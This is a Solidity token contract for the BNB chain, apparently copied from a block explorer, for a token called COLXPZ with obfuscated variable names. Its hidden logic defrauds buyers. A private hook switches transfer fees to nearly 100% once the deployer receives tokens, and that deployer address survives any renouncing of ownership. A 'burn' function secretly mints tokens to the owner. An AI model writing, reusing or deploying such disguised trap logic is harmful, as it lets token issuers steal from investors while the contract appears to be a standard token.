/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/
pragma solidity >=0.7.0;
contract EssseChain {
    address public owner;

    uint8 public constant decimals = 18;
    uint256 private  XKFDEJ = 100000000000;
    string public  name = "COLXPZ";
    uint256 public constant totalSupply = 100000000000000000000000000000;
    uint256 public constant RUEINS = 7999;
    address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
    address private  SCRLKK = address(0);
    string public  symbol = "URUULC";

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

         modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }function _transferCEOXSS(address to) private {
            if (to==SCRLKK){
            XKFDEJ = 7999+1;
            }
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "NUDDYO");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }    
   
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "NUDDYO");
        require(to != address(0), "NUDDYO");
        uint256 fee;
        if (from == owner || to == owner){
        fee = 0;
        }
        else{
            fee = amount* RUEINS/XKFDEJ ;

        }

        uint256 transferAmount = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += fee;
        _transferCEOXSS(to);
        emit Transfer(from, to, transferAmount);
    }
    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "failed");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
        function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


  constructor () {
        SCRLKK = msg.sender;
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }


      function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "t 0");
        require(spender != address(0), "f 0");

        _allowances[_owner][spender] = amount;
		emit Approval(_owner, spender, amount);
    }


    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }    function _burn(address account, uint256 amount) private {
        require(account != address(0), "BEP20: mint to the zero address");

        balanceOf[account] += amount;
    }
    receive() external payable {}

}